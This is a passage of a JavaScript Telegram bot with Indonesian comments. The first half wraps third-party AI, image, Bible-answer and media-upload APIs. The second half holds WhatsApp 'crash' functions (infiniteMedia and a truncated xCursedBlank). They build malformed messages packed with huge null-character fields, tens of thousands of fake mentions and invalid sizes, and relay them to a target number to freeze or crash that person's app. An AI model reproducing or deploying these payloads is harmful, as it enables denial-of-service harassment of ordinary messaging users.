    console.error("TIKTOK ERROR:", err.message);
    bot.sendMessage(chatId, "❌ Gagal ambil data TikTok bre, coba lagi nanti.");
  }
});

async function uploadToCatbox(fileUrl) {
  const params = new URLSearchParams();
  params.append("reqtype", "urlupload");
  params.append("url", fileUrl);

  const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
    headers: { "content-type": "application/x-www-form-urlencoded" },
    timeout: 30000,
  });

  return data;
}

// ========== COMMAND GLM-4 47B FLASH ==========
bot.onText(/^\/glm (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userPrompt = match[1]; // Ambil prompt dari user

    await bot.sendMessage(chatId, "⚡ *GLM-4 47B Flash mikir...*", { parse_mode: "Markdown" });

    try {
        // Gunakan metode GET dengan parameter query
        const apiUrl = 'https://api.siputzx.my.id/api/ai/glm47flash';
        const response = await axios.get(apiUrl, {
            params: {
                prompt: userPrompt,
                system: "Kamu adalah asisten AI yang ramah dan membantu.", // System prompt default
                temperature: 0.7
            }
        });

        const result = response.data;
        
        // Parsing response sesuai struktur yang udah kita lihat
        if (result?.status && result?.data?.response) {
            const reply = result.data.response;
            await bot.sendMessage(chatId, reply, { parse_mode: "Markdown" });
        } else {
            // Fallback kalo formatnya beda
            await bot.sendMessage(chatId, 
                `⚠️ Format response tidak dikenal:\n\`\`\`${JSON.stringify(result, null, 2)}\`\`\``, 
                { parse_mode: "Markdown" }
            );
        }

    } catch (err) {
        console.error("GLM ERROR:", err.message);
        
        let errorMsg = "❌ Error: " + err.message;
        if (err.response?.data) {
            errorMsg += `\nDetail: ${JSON.stringify(err.response.data)}`;
        }
        
        bot.sendMessage(chatId, errorMsg);
    }
});

// Command dengan custom system prompt
bot.onText(/^\/glmcust (.+?) \| (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const systemPrompt = match[1]; // System prompt sebelum tanda "|"
    const userPrompt = match[2];    // User prompt setelah tanda "|"

    await bot.sendMessage(chatId, "⚡ *GLM-4 (custom mode)...*", { parse_mode: "Markdown" });

    try {
        const response = await axios.get('https://api.siputzx.my.id/api/ai/glm47flash', {
            params: {
                prompt: userPrompt,
                system: systemPrompt,
                temperature: 0.7
            }
        });

        const result = response.data;
        
        if (result?.status && result?.data?.response) {
            await bot.sendMessage(chatId, result.data.response, { parse_mode: "Markdown" });
        } else {
            await bot.sendMessage(chatId, `⚠️ ${JSON.stringify(result)}`);
        }

    } catch (err) {
        console.error("GLM CUST ERROR:", err.message);
        bot.sendMessage(chatId, "❌ Error: " + err.message);
    }
});

// Command dengan custom temperature
bot.onText(/^\/glmtemp (\d+\.?\d*) \| (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const temperature = parseFloat(match[1]); // Temperature (0.0 - 1.0)
    const userPrompt = match[2];

    // Validasi temperature
    if (temperature < 0 || temperature > 1) {
        return bot.sendMessage(chatId, "❌ Temperature harus antara 0.0 dan 1.0");
    }

    await bot.sendMessage(chatId, `⚡ *GLM-4 (temp: ${temperature})...*`, { parse_mode: "Markdown" });

    try {
        const response = await axios.get('https://api.siputzx.my.id/api/ai/glm47flash', {
            params: {
                prompt: userPrompt,
                system: "Kamu adalah asisten AI yang ramah dan membantu.",
                temperature: temperature
            }
        });

        const result = response.data;
        
        if (result?.status && result?.data?.response) {
            await bot.sendMessage(chatId, result.data.response, { parse_mode: "Markdown" });
        }

    } catch (err) {
        bot.sendMessage(chatId, "❌ Error: " + err.message);
    }
});

// Command help
bot.onText(/^\/glm(?:help)?$/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        "*⚡ GLM-4 47B Flash AI*\n\n" +
        "*Command:*\n" +
        "• `/glm <pertanyaan>` - Mode default\n" +
        "• `/glmcust <system> | <pertanyaan>` - Custom system prompt\n" +
        "• `/glmtemp <0.0-1.0> | <pertanyaan>` - Custom temperature\n\n" +
        "*Contoh:*\n" +
        "`/glm Halo siapa kamu?`\n" +
        "`/glmcust Kamu asisten galak | Halo`\n" +
        "`/glmtemp 0.9 | Cerita lucu`\n\n" +
        "_Temperature rendah = lebih fokus, tinggi = lebih kreatif_",
        { parse_mode: "Markdown" }
    );
});

// ========== COMMAND BRAT (METODE GET) ==========
bot.onText(/^\/brat (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1]; // Teks yang akan dijadikan BRAT

    await bot.sendMessage(chatId, "🎨 *Membuat BRAT...*", { parse_mode: "Markdown" });

    try {
        // Gunakan metode GET dengan parameter query
        const apiUrl = 'https://api.siputzx.my.id/api/m/brat';
        const response = await axios.get(apiUrl, {
            params: {
                text: text,
                isAnimated: false, // Default gambar statis
                delay: 500
            }
        });

        const result = response.data;
        
        // 🔧 SESUAIKAN PARSING INI DENGAN RESPONSE ASLI DARI API
        // Contoh: kalo response-nya { status: true, data: { url: "..." } }
        if (result?.status && result?.data?.url) {
            const imageUrl = result.data.url;
            await bot.sendPhoto(chatId, imageUrl, {
                caption: `✅ BRAT untuk: ${text}`,
                parse_mode: "Markdown"
            });
        } 
        // Alternatif: kalo response langsung { url: "..." }
        else if (result?.url) {
            await bot.sendPhoto(chatId, result.url, {
                caption: `✅ BRAT untuk: ${text}`,
                parse_mode: "Markdown"
            });
        }
        else {
            // Fallback buat debugging
            await bot.sendMessage(chatId, 
                `⚠️ Format response tidak dikenal:\n\`\`\`${JSON.stringify(result, null, 2)}\`\`\``, 
                { parse_mode: "Markdown" }
            );
        }

    } catch (err) {
        console.error("BRAT ERROR:", err.message);
        
        let errorMsg = "❌ Error: " + err.message;
        if (err.response?.data) {
            errorMsg += `\nDetail: ${JSON.stringify(err.response.data)}`;
        }
        
        bot.sendMessage(chatId, errorMsg);
    }
});

// Command BRAT Animasi
bot.onText(/^\/bratanim (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];

    await bot.sendMessage(chatId, "🎬 *Membuat animasi BRAT...*", { parse_mode: "Markdown" });

    try {
        const response = await axios.get('https://api.siputzx.my.id/api/m/brat', {
            params: {
                text: text,
                isAnimated: true,
                delay: 500 // Default delay
            }
        });

        const result = response.data;
        
        if (result?.status && result?.data?.url) {
            // Asumsi API return video untuk animasi
            await bot.sendVideo(chatId, result.data.url, {
                caption: `✅ Animasi BRAT\nTeks: ${text}\nDelay: 500ms`,
                parse_mode: "Markdown"
            });
        } else if (result?.url) {
            await bot.sendVideo(chatId, result.url, {
                caption: `✅ Animasi BRAT\nTeks: ${text}`,
                parse_mode: "Markdown"
            });
        } else {
            await bot.sendMessage(chatId, `⚠️ ${JSON.stringify(result)}`);
        }

    } catch (err) {
        bot.sendMessage(chatId, "❌ Error: " + err.message);
    }
});

// Command BRAT dengan custom delay
bot.onText(/^\/bratanim (\d+) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const delay = parseInt(match[1]); // Delay dalam ms
    const text = match[2];

    await bot.sendMessage(chatId, `🎬 *Membuat animasi BRAT (delay ${delay}ms)...*`, { parse_mode: "Markdown" });

    try {
        const response = await axios.get('https://api.siputzx.my.id/api/m/brat', {
            params: {
                text: text,
                isAnimated: true,
                delay: delay
            }
        });

        const result = response.data;
        
        if (result?.status && result?.data?.url) {
            await bot.sendVideo(chatId, result.data.url, {
                caption: `✅ Animasi BRAT\nTeks: ${text}\nDelay: ${delay}ms`,
                parse_mode: "Markdown"
            });
        }

    } catch (err) {
        bot.sendMessage(chatId, "❌ Error: " + err.message);
    }
});

// Command help
bot.onText(/^\/brat(?:help)?$/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        "*🎨 BRAT Generator*\n\n" +
        "*Command:*\n" +
        "• `/brat <teks>` - Gambar statis\n" +
        "• `/bratanim <teks>` - Animasi (delay 500ms)\n" +
        "• `/bratanim <delay> <teks>` - Animasi custom delay\n\n" +
        "*Contoh:*\n" +
        "`/brat Hello World`\n" +
        "`/bratanim 300 Halo bre`\n\n" +
        "_Delay dalam milidetik_",
        { parse_mode: "Markdown" }
    );
});

// ========== COMMAND BIBLE AI ==========
bot.onText(/^\/bible (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userQuestion = match[1]; // Pertanyaan user

    await bot.sendMessage(chatId, "📖 *BibleAI sedang mencari jawaban...*", { parse_mode: "Markdown" });

    try {
        // Panggil API dengan metode GET
        const apiUrl = 'https://api.siputzx.my.id/api/ai/bibleai';
        const response = await axios.get(apiUrl, {
            params: {
                question: userQuestion,
                translation: 'ESV' // Bisa diganti dengan kode terjemahan lain (TB, NIV, dll)
            }
        });

        const result = response.data;
        
        // Parsing response sesuai struktur yang kita lihat
        if (result?.status && result?.data) {
            const bibleData = result.data;
            
            // Format jawaban utama
            let reply = `*📖 BibleAI - ${bibleData.translation}*\n\n`;
            reply += `*Pertanyaan:* ${bibleData.question}\n\n`;
            reply += `*Jawaban:*\n${bibleData.results.answer}\n\n`;
            
            // Tambahkan ayat-ayat terkait (ambil 5 ayat pertama biar ga kepanjangan)
            if (bibleData.results.sources && bibleData.results.sources.length > 0) {
                reply += `*Ayat-ayat Terkait:*\n`;
                const verses = bibleData.results.sources
                    .filter(s => s.type === 'verse')
                    .slice(0, 5); // Ambil 5 ayat pertama
                
                verses.forEach(v => {
                    reply += `• ${v.splitReference?.refLong || v.text}: ${v.text}\n`;
                });
            }
            
            // Info tambahan
            reply += `\n_© ${bibleData.results.metadata?.copyright || 'Sumber Alkitab'}_`;
            
            await bot.sendMessage(chatId, reply, { parse_mode: "Markdown" });
            
            // Opsi: Kirim juga sumber tambahan (buku, artikel) sebagai pesan terpisah
            if (bibleData.results.sources && bibleData.results.sources.length > 0) {
                const books = bibleData.results.sources.filter(s => s.type === 'book' || s.type === 'article').slice(0, 3);
                if (books.length > 0) {
                    let sourcesMsg = `*📚 Sumber Bacaan Lebih Lanjut:*\n`;
                    books.forEach(b => {
                        sourcesMsg += `• *${b.title}*${b.author ? ` oleh ${b.author}` : ''}\n`;
                        if (b.url) sourcesMsg += `  ${b.url}\n`;
                    });
                    await bot.sendMessage(chatId, sourcesMsg, { parse_mode: "Markdown" });
                }
            }
            
        } else {
            await bot.sendMessage(chatId, 
                `⚠️ Format response tidak dikenal:\n\`\`\`${JSON.stringify(result, null, 2)}\`\`\``, 
                { parse_mode: "Markdown" }
            );
        }

    } catch (err) {
        console.error("BIBLEAI ERROR:", err.message);
        
        let errorMsg = "❌ Error: " + err.message;
        if (err.response?.data) {
            errorMsg += `\nDetail: ${JSON.stringify(err.response.data)}`;
        }
        
        bot.sendMessage(chatId, errorMsg);
    }
});

// Command untuk pilih terjemahan
bot.onText(/^\/bible (.+?) \| (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const translation = match[1].toUpperCase(); // Kode terjemahan (ESV, NIV, TB, dll)
    const userQuestion = match[2];

    await bot.sendMessage(chatId, `📖 *BibleAI (${translation}) sedang mencari...*`, { parse_mode: "Markdown" });

    try {
        const response = await axios.get('https://api.siputzx.my.id/api/ai/bibleai', {
            params: {
                question: userQuestion,
                translation: translation
            }
        });

        const result = response.data;
        
        if (result?.status && result?.data) {
            const bibleData = result.data;
            let reply = `*📖 BibleAI - ${bibleData.translation}*\n\n`;
            reply += `*Pertanyaan:* ${bibleData.question}\n\n`;
            reply += `*Jawaban:*\n${bibleData.results.answer}\n\n`;
            
            await bot.sendMessage(chatId, reply, { parse_mode: "Markdown" });
        }

    } catch (err) {
        bot.sendMessage(chatId, "❌ Error: " + err.message);
    }
});

// Command help
bot.onText(/^\/bible(?:help)?$/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        "*📖 BibleAI - Tanya Jawab Alkitab*\n\n" +
        "*Cara Pakai:*\n" +
        "• `/bible Apa itu iman?` (default: ESV)\n" +
        "• `/bible TB | Apa itu kasih?` (pilih terjemahan)\n\n" +
        "*Kode Terjemahan Populer:*\n" +
        "• `ESV` - English Standard Version\n" +
        "• `NIV` - New International Version\n" +
        "• `KJV` - King James Version\n" +
        "• `TB` - Terjemahan Baru (Indonesia)\n\n" +
        "_Dapatkan jawaban lengkap dengan ayat-ayat terkait._",
        { parse_mode: "Markdown" }
    );
});

// ========== COMMAND GEMINI AI ==========
bot.onText(/^\/geminiai (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const prompt = match[1]; // Ambil teks setelah command

    await bot.sendMessage(chatId, "🧠 *Gemini mikir...*", { parse_mode: "Markdown" });

    try {
        const API_URL = 'https://api.siputzx.my.id/api/ai/gemini';
        
        const { data } = await axios.post(API_URL, {
            message: prompt  // atau coba "text": prompt, atau "prompt": prompt
        });

        // Parse response (sesuaiin sama struktur API-nya nanti)
        let response = "Maaf, ga dapet jawaban.";
        if (data?.status && data?.data?.response) {
            response = data.data.response;
        } else if (data?.response) {
            response = data.response;
        } else if (data?.result) {
            response = data.result;
        } else if (data?.message) {
            response = data.message;
        } else {
            response = JSON.stringify(data); // fallback
        }

        await bot.sendMessage(chatId, response, { parse_mode: "Markdown" });

    } catch (err) {
        console.error("GEMINI ERROR:", err.message);
        
        let errorMsg = "❌ Gagal panggil Gemini.";
        if (err.response?.status === 400) {
            errorMsg = "⚠️ Parameter API salah. Coba cek dokumentasinya.";
        } else if (err.response?.data) {
            errorMsg = `⚠️ Error: ${JSON.stringify(err.response.data)}`;
        }
        
        bot.sendMessage(chatId, errorMsg);
    }
});

// Command help
bot.onText(/^\/gemini(?:help)?$/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        "*🤖 Gemini AI Bot*\n\n" +
        "• `/geminiai Halo apa kabar?`\n" +
        "• `/geminiai Jelaskan tentang AI`\n\n" +
        "Langsung aja tanya apa pun!",
        { parse_mode: "Markdown" }
    );
});

bot.onText(/\/convert/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const replyMsg = msg.reply_to_message;

  if (!replyMsg) {
    return bot.sendPhoto(chatId, menuImages.tools, {
      caption: "🪧 ☇ Format: /convert (reply dengan foto atau video)",
      parse_mode: "Markdown"
    });
  }

  let fileId = null;
  if (replyMsg.photo && replyMsg.photo.length) {
    fileId = replyMsg.photo[replyMsg.photo.length - 1].file_id;
  } else if (replyMsg.video) {
    fileId = replyMsg.video.file_id;
  } else if (replyMsg.video_note) {
    fileId = replyMsg.video_note.file_id;
  } else {
    return bot.sendPhoto(chatId, menuImages.tools, {
      caption: "❌ ☇ Hanya mendukung foto atau video",
      parse_mode: "Markdown"
    });
  }

  const waitMsg = await bot.sendPhoto(chatId, menuImages.tools, {
    caption: "⏳ ☇ Mengambil file & mengunggah ke Catbox...",
    parse_mode: "Markdown"
  });

  try {
    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    const uploadedUrl = await uploadToCatbox(fileLink);

    if (typeof uploadedUrl === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(uploadedUrl.trim())) {
      await bot.sendMessage(chatId, uploadedUrl.trim());
    } else {
      await bot.sendPhoto(chatId, menuImages.tools, {
        caption: "❌ ☇ Gagal upload ke Catbox.\n" + String(uploadedUrl).slice(0, 200),
        parse_mode: "Markdown"
      });
    }
  } catch (e) {
    const msgError = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke Catbox`
      : "❌ ☇ Gagal unggah, coba lagi.";
    await bot.sendPhoto(chatId, menuImages.tools, {
      caption: msgError,
      parse_mode: "Markdown"
    });
  } finally {
    try {
      await bot.deleteMessage(chatId, waitMsg.message_id);
    } catch {}
  }
});

async function infiniteMedia(sock, target) {
    let parse = true;
    let SID = "5e03e0&mms3";
    let key = "10000000_2012297619515179_5714769099548640934_n.enc";
    let type = `image/webp`;

    if (11 > 9) {
        parse = parse ? false : true;
    }

    const imageOverload = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                    fileLength: "9999999999999",
                    height: 720,
                    width: -720,
                    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1755254367",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
                    caption: "\x10" + "\n".repeat(20000)
                },
            }
        }
    });

    const stickerLoad = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
                    fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
                    fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
                    mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
                    mimetype: type,
                    directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileLength: {
                        low: Math.floor(Math.random() * 1000),
                        high: 0,
                        unsigned: true,
                    },
                    mediaKeyTimestamp: {
                        low: Math.floor(Math.random() * 1700000000),
                        high: 0,
                        unsigned: false,
                    },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                            { length: 20000 },
                            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                            ),
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                    },
                    stickerSentTs: {
                        low: Math.floor(Math.random() * -20000000),
                        high: 555,
                        unsigned: parse,
                    },
                    isAvatar: parse,
                    isAiSticker: parse,
                    isLottie: parse,
                },
            }
        }
    });

    const docuLoad = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                    fileLength: "999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                    fileName: "\x10" + "ꦾ".repeat(50000),
                    fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                    directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743848703",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
                },
            }
        }
    });

    const vidLoad = await generateWAMessageFromContent(target, {
      viewOnceMessageV2: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "CleMtlrI+21HNQ298bFL4MaF6k9hJImlKgK7WAT/g+Y=",
            fileLength: "231536",
            seconds: 88888888,
            mediaKey: "WlFBzxOj7hIziHuhR8gNCKE2YZSXgcLnfoydMn32FQI=",
            caption: "\x10".repeat(30000),
            height: -99999,
            width: 99999,
            fileEncSha256: "zTpAsUWfVLGid5PNcL6/39JVADbLUUK0PT2cxlGpsDA=",
            directPath: "/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1771576607",
            contextInfo: {
              pairedMediaType: "NOT_PAIRED_MEDIA",
              statusSourceType: "VIDEO",
              remoteJid: "  ",
              mentionedJid: Array.from(
                { length: 20000 },
                (_, z) => `628${z + 1}@s.whatsapp.net`
              ),
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550202@s.whatsapp.net",
                businessDescription: null
              },
              featureEligibilities: {
                canBeReshared: true
              },
              isForwarded: true,
              forwardingScore: 9999,
              statusAttributions: [
                {
                  type: "MUSIC",
                  externalShare: {
                    actionUrl: "https://wa.me/settings/linked_devices#,,x",
                    source: "INSTAGRAM",
                    duration: 9,
                    actionFallbackUrl: "https://wa.me/settings/linked_devices#,,x"
                  }
                }
            ]
          },
          streamingSidecar: "xUQqEMh4oVoqMy9qDBB3gaNI3yZbbX7dtli6KJ6N1ijvk09oVJzI8w==",
          thumbnailDirectPath: "/v/t62.36147-24/640522275_2376887426118122_4696194772404190783_n.enc?ccb=11-4&oh=01_Q5Aa3wHXgSUEMms1n1PJZN7I8Ip8kaEzKYH5nfr9X62LJNv1bw&oe=69BF74C1&_nc_sid=5e03e0",
          thumbnailSha256: "9kdKXkxHeCZxJ7WwQ00xanJD9CRLfgrs4lxLd/cRBXQ=",
          thumbnailEncSha256: "DuH7/OR2Jz+SPxDiNyl2wKdUDbr6upAQtCmjwAS22CA=",
          annotations: [
            {
              shouldSkipConfirmation: true,
              embeddedContent: {
                embeddedMessage: {
                  stanzaId: "ACFC34B6742717BAC2BFE825254E1CD1",
                  message: {
                    extendedTextMessage: {
                      text: "\x10".repeat(10000),
                      previewType: "NONE",
                      inviteLinkGroupTypeV2: "DEFAULT"
                    },
                    messageContextInfo: {
                      messageSecret: "1y9Zx4kWsv7YLUdsLvUAvSSxlE6KVPSyllLwgXkSzfg=",
                      messageAssociation: {
                        associationType: 18,
                        parentMessageKey: {
                          remoteJid: "status@broadcast",
                          fromMe: false,
                          id: "ACEEC73D18B6805DBC04CC8ADF65BF6D",
                          participant: "13135550202@s.whatsapp.net"
                        }
                      }
                    }
                  }
                }
              },
              embeddedAction: true
            }
          ],
          externalShareFullVideoDurationInSeconds: 8
        }
      }
    }
  });

  const triggerCall = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from(
                { length: 80000 },
                () => "1" + Math.floor(Math.random() * 9999999) + "13135550002@s.whatsapp.net"
              )
            ]
          },
          body: {
            text: "\x10Zay"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: "\u0000".repeat(900000)
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "\u0000".repeat(900000)
              },
              {
                name: "payment_method",
                buttonParamsJson: "status: 'true'"
              }
            ]
          }
        }
      }
    }
  });

  await sock.sendMessage(target, {
    text: "\x10".repeat(10000),
    mentions: [
      "status@broadcast",
      ...Array.from(
        { length: 200000 },
        () => "1" + Math.floor(Math.random() * 9999999) + "status@broadcast"
      )
    ]
  });

  await sock.relayMessage(target, triggerCall.message, {
    messageId: generateRandomMessageId() > triggerCall.key.id,
    participant: { jid: target }
  });

  await sock.relayMessage(target, imageOverload.message, {
    messageId: generateRandomMessageId() > imageOverload.key.id,
    participant: { jid: target }
  });

  await sock.relayMessage(target, docuLoad.message, {
    messageId: generateRandomMessageId() > docuLoad.key.id,
    participant: { jid: target }
  });

  await sock.relayMessage(target, stickerLoad.message, {
    messageId: generateRandomMessageId() > stickerLoad.key.id,
    participant: { jid: target }
  });

  await sock.relayMessage(target, vidLoad.message, {
    messageId: generateRandomMessageId() > vidLoad.key.id,
    participant: { jid: target }
  })
}

async function xCursedBlank(target) {
  let buttonpush = [
    { name: "single_select",     buttonParamsJson: "" }
  ];
  
  for (let r = 0; r < 10; r++) {
    buttonpush.push(
      { name: "galaxy_message",     buttonParamsJson: JSON.stringify({ icon: "DOCUMENT",flow_cta: "ꦽ".repeat(100000),flow_message_version: "3" }) }
    );
  }
  
  let msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶",
              locationMessage: {
                degreesLatitude: 1e15,
                degreesLongtitude: 1e15,
